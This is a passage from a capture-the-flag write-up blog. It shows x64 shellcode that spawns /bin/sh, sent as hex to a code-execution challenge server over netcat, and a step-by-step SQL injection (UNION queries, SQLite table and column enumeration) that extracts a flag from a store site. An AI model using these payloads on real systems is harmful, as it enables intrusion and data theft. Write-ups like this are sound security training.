&lt;span class=&quot;n&quot;&gt;ftype&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ctypes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;CFUNCTYPE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ctypes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c_void_p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;fpointer&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ctypes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c_void_p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;from_buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ftype&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ctypes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;addressof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fpointer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
  
&lt;span class=&quot;n&quot;&gt;u_can_do_it&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fromhex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;So enter whatever you want 👍 (in hex): &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
  
&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;u_can_do_it&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  
&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
  
&lt;span class=&quot;k&quot;&gt;del&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fpointer&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
  
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;byebye&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;It looks like the python code:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Defines a chunk of memory that can be read, written to, and executed called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;buf&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;Assigns the memory to a function &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;f&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;Takes a hex list from the user and writes it to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;buf&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;Runs &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;f()&lt;/code&gt;, executing whatever is in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;buf&lt;/code&gt;
Basically, a super simple Remote Code Execution (RCE) vulnerability.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;I started writing my own shellcode, but I decided to do the safe thing and find shellcode off the internet and run it without knowing what it did. I found a website called &lt;a href=&quot;https://shell-storm.org/shellcode/index.html&quot;&gt;Shell Storm&lt;/a&gt; that is a repository of shellcode samples for any kind of architecture. I landed on &lt;a href=&quot;https://shell-storm.org/shellcode/files/shellcode-905.html&quot;&gt;this&lt;/a&gt; one that executes &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/bin/sh&lt;/code&gt; using an &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;execveat&lt;/code&gt; call for an x64 architecture. Here’s the assembly:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;6a 42                   push   0x42
58                      pop    rax
fe c4                   inc    ah
48 99                   cqo
52                      push   rdx
48 bf 2f 62 69 6e 2f    movabs rdi, 0x68732f2f6e69622f
2f 73 68
57                      push   rdi
54                      push   rsp
5e                      pop    rsi
49 89 d0                mov    r8, rdx
49 89 d2                mov    r10, rdx
0f 05                   syscall
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Doing some quick preprocessing in the Python REPL shell:&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&quot;
...     0x6a, 0x42, 0x58, 0xfe, 0xc4, 0x48, 0x99, 0x52, 0x48, 0xbf,
...     0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x2f, 0x73, 0x68, 0x57, 0x54,
...     0x5e, 0x49, 0x89, 0xd0, 0x49, 0x89, 0xd2, 0x0f, 0x05&quot;&quot;&quot;&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;elem&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:]&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;elem&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;,&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)])&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;6a4258fec448995248bf2f62696e2f2f736857545e4989d04989d20f05&apos;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We get a string that the server will accept and run:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;23:53&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;~/ctf/angstrom/presidential ➭ nc challs.actf.co 31200
White House declared Python to be memory safe :tm:
So enter whatever you want 👍 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;hex&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: 6a4258fec448995248bf2f62696e2f2f736857545e4989d04989d20f05
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This gives as a very slimmed down shell for a few seconds, however we can still grab the information we need:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;23:54&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;~/ctf/angstrom/presidential ➭ nc challs.actf.co 31200
White House declared Python to be memory safe :tm:
So enter whatever you want 👍 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;hex&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: 6a4258fec448995248bf2f62696e2f2f736857545e4989d04989d20f05
&lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Rnw&lt;/span&gt; actf &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
./run:7:flag &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;actf{python_is_memory_safe_4a105261}&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;store&quot;&gt;Store&lt;/h2&gt;
&lt;p&gt;In this challenge, we get a simple storefront.
&lt;img src=&quot;assets/images/blog/week9/store-front.png&quot; alt=&quot;assets/images/blog/week9/store-front.png&quot; /&gt;
&lt;br /&gt;
&lt;img src=&quot;assets/images/blog/week9/store-front-searched.png&quot; alt=&quot;assets/images/blog/week9/store-front-searched.png&quot; /&gt;
This screams SQL injection, so lets intercept the request in Burp Suite repeater and test it:&lt;/p&gt;

&lt;div class=&quot;language-http highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nf&quot;&gt;POST&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;/search&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;HTTP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1.1&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;Host&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;store.web.actf.co&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;Content-Length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;24&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;Cache-Control&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;max-age=0&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;Sec-Ch-Ua&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Chromium&quot;;v=&quot;125&quot;, &quot;Not.A/Brand&quot;;v=&quot;24&quot;&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;Sec-Ch-Ua-Mobile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;?0&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;Sec-Ch-Ua-Platform&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Windows&quot;&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;Upgrade-Insecure-Requests&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;1&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;Origin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;https://store.web.actf.co&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;Content-Type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;application/x-www-form-urlencoded&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;User-Agent&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.60 Safari/537.36&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;Accept&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;Sec-Fetch-Site&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;same-origin&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;Sec-Fetch-Mode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;navigate&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;Sec-Fetch-User&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;?1&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;Sec-Fetch-Dest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;document&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;Referer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;https://store.web.actf.co/search&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;Accept-Encoding&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;gzip, deflate, br&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;Accept-Language&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;en-US,en;q=0.9&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;Priority&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;u=0, i&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;Connection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;keep-alive&lt;/span&gt;

item=Otamatone&apos; OR 1=1--
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Returns&lt;/p&gt;
&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;table&amp;gt;&lt;/span&gt;
	&lt;span class=&quot;nt&quot;&gt;&amp;lt;tr&amp;gt;&lt;/span&gt;
		&lt;span class=&quot;nt&quot;&gt;&amp;lt;th&amp;gt;&lt;/span&gt;Name&lt;span class=&quot;nt&quot;&gt;&amp;lt;/th&amp;gt;&lt;/span&gt;
		&lt;span class=&quot;nt&quot;&gt;&amp;lt;th&amp;gt;&lt;/span&gt;Details&lt;span class=&quot;nt&quot;&gt;&amp;lt;/th&amp;gt;&lt;/span&gt;
	&lt;span class=&quot;nt&quot;&gt;&amp;lt;/tr&amp;gt;&lt;/span&gt;                
	&lt;span class=&quot;nt&quot;&gt;&amp;lt;tr&amp;gt;&lt;/span&gt;
		&lt;span class=&quot;nt&quot;&gt;&amp;lt;td&amp;gt;&lt;/span&gt;Otamatone&lt;span class=&quot;nt&quot;&gt;&amp;lt;/td&amp;gt;&lt;/span&gt;
		&lt;span class=&quot;nt&quot;&gt;&amp;lt;td&amp;gt;&lt;/span&gt;A extremely serious synthesizer. Comes in a variety of colors&lt;span class=&quot;nt&quot;&gt;&amp;lt;/td&amp;gt;&lt;/span&gt;
	&lt;span class=&quot;nt&quot;&gt;&amp;lt;/tr&amp;gt;&lt;/span&gt;
	&lt;span class=&quot;nt&quot;&gt;&amp;lt;tr&amp;gt;&lt;/span&gt;
		&lt;span class=&quot;nt&quot;&gt;&amp;lt;td&amp;gt;&lt;/span&gt;Echo dot&lt;span class=&quot;nt&quot;&gt;&amp;lt;/td&amp;gt;&lt;/span&gt;
		&lt;span class=&quot;nt&quot;&gt;&amp;lt;td&amp;gt;&lt;/span&gt;A smart speaker that can play music, make calls, and answer questions.&lt;span class=&quot;nt&quot;&gt;&amp;lt;/td&amp;gt;&lt;/span&gt;
	&lt;span class=&quot;nt&quot;&gt;&amp;lt;/tr&amp;gt;&lt;/span&gt;                
	&lt;span class=&quot;nt&quot;&gt;&amp;lt;tr&amp;gt;&lt;/span&gt;
		&lt;span class=&quot;nt&quot;&gt;&amp;lt;td&amp;gt;&lt;/span&gt;Razer Cynosa Chroma&lt;span class=&quot;nt&quot;&gt;&amp;lt;/td&amp;gt;&lt;/span&gt;
		&lt;span class=&quot;nt&quot;&gt;&amp;lt;td&amp;gt;&lt;/span&gt;A gaming keyboard with customizable RGB lighting.&lt;span class=&quot;nt&quot;&gt;&amp;lt;/td&amp;gt;&lt;/span&gt;
	&lt;span class=&quot;nt&quot;&gt;&amp;lt;/tr&amp;gt;&lt;/span&gt;                
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/table&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Showing that an SQL injection is possible. From now I’m going to truncate the inputs and results for my sanity.&lt;/p&gt;

&lt;p&gt;I bet we need to execute a UNION attack, which requires us to know the number of columns in the current table. Beyond the name and details column, there’s a hidden primary key column, so let’s try to UNION the result with 3 columns of made up values:&lt;/p&gt;
&lt;div class=&quot;language-sql highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;item&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Otamatone&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos; UNION SELECT &apos;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;,&apos;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;,&apos;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;--
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This successfully concatenates an extra result:&lt;/p&gt;
&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;tr&amp;gt;&lt;/span&gt;
	&lt;span class=&quot;nt&quot;&gt;&amp;lt;td&amp;gt;&lt;/span&gt;b&lt;span class=&quot;nt&quot;&gt;&amp;lt;/td&amp;gt;&lt;/span&gt;
	&lt;span class=&quot;nt&quot;&gt;&amp;lt;td&amp;gt;&lt;/span&gt;c&lt;span class=&quot;nt&quot;&gt;&amp;lt;/td&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/tr&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;To prove this is the case, adding or removing a value causes an error to be thrown:&lt;/p&gt;
&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;p&amp;gt;&lt;/span&gt;An error occurred.&lt;span class=&quot;nt&quot;&gt;&amp;lt;/p&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Now we need to figure out if there are any other tables in the database, but first we need to fingerprint the database used by the backend. I’ve done a lot of SQL injection, and it almost is always done in SQLite. We can use the following query to test my suspicion:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-SQL&quot;&gt;item=Otamatone&apos; OR sqlite_version()=sqlite_version()--
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This returns the same result as my first query which shows all the entries in the table, that is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sqlite_version()&lt;/code&gt; evaluates to a value, meaning that the app is using SQLite on the backend. We can use this information to look a list of all the tables in the database:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-SQL&quot;&gt;item=Otamatone&apos; UNION SELECT &apos;a&apos;, name,&apos;c&apos; FROM sqlite_master--
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This returned:&lt;/p&gt;
&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;tr&amp;gt;&lt;/span&gt;
	&lt;span class=&quot;nt&quot;&gt;&amp;lt;td&amp;gt;&lt;/span&gt;flags18999e4de24f117351f28f01382746e3&lt;span class=&quot;nt&quot;&gt;&amp;lt;/td&amp;gt;&lt;/span&gt;
	&lt;span class=&quot;nt&quot;&gt;&amp;lt;td&amp;gt;&lt;/span&gt;c&lt;span class=&quot;nt&quot;&gt;&amp;lt;/td&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/tr&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Looks like there is a table called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;flags18999e4de24f117351f28f01382746e3&lt;/code&gt; in the database. Let’s look at the column names of the table so we know what to fuse it with:&lt;/p&gt;
&lt;div class=&quot;language-sql highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;item&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Otamatone&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos; UNION SELECT &apos;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;, name,&apos;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos; FROM PRAGMA_TABLE_INFO(&apos;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;flags18999e4de24f117351f28f01382746e3&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;)--
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This returned:&lt;/p&gt;
&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;tr&amp;gt;&lt;/span&gt;
	&lt;span class=&quot;nt&quot;&gt;&amp;lt;td&amp;gt;&lt;/span&gt;flag&lt;span class=&quot;nt&quot;&gt;&amp;lt;/td&amp;gt;&lt;/span&gt;
	&lt;span class=&quot;nt&quot;&gt;&amp;lt;td&amp;gt;&lt;/span&gt;c&lt;span class=&quot;nt&quot;&gt;&amp;lt;/td&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/tr&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We can get all the values from the flag column in the other table using:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-SQL&quot;&gt;item=Otamatone&apos; UNION SELECT &apos;a&apos;, flag,&apos;c&apos; FROM flags2cdc14366379a92e44d8f438ff39afe6--
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This prints out the flag!&lt;/p&gt;
&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;tr&amp;gt;&lt;/span&gt;
	&lt;span class=&quot;nt&quot;&gt;&amp;lt;td&amp;gt;&lt;/span&gt;actf{37619bbd0b81c257b70013fa1572f4ed}&lt;span class=&quot;nt&quot;&gt;&amp;lt;/td&amp;gt;&lt;/span&gt;
	&lt;span class=&quot;nt&quot;&gt;&amp;lt;td&amp;gt;&lt;/span&gt;c&lt;span class=&quot;nt&quot;&gt;&amp;lt;/td&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/tr&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Two summers ago, this challenge would have taken me hours. It’s amazing to see how quickly I was able to find the information I needed to solve this challenge. I’m excited to see what I’ll be doing two summers from now!&lt;/p&gt;

&lt;p&gt;To remedy this exploit, simply sanitize the user input using a reputable sql sanitization library.&lt;/p&gt;
&lt;h2 id=&quot;winds&quot;&gt;Winds&lt;/h2&gt;

&lt;p&gt;Jekyll interprets &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;{&lt;/code&gt; as special syntax, so some of the inputs are incorrect. If running this yourself, make sure to remove any &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;\&lt;/code&gt; chars in front of a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;{&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;We get a simple website that takes a user input, scrambles it, then displays it:
&lt;img src=&quot;assets/images/blog/week9/wind-page.png&quot; alt=&quot;assets/images/blog/week9/wind-page.png&quot; /&gt;
&lt;br /&gt;
&lt;img src=&quot;assets/images/blog/week9/wind-page-scrambled.png&quot; alt=&quot;assets/images/blog/week9/wind-page-scrambled.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Here’s the source code:&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;random&lt;/span&gt;
  
&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;flask&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Flask&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;redirect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;render_template_string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;
  
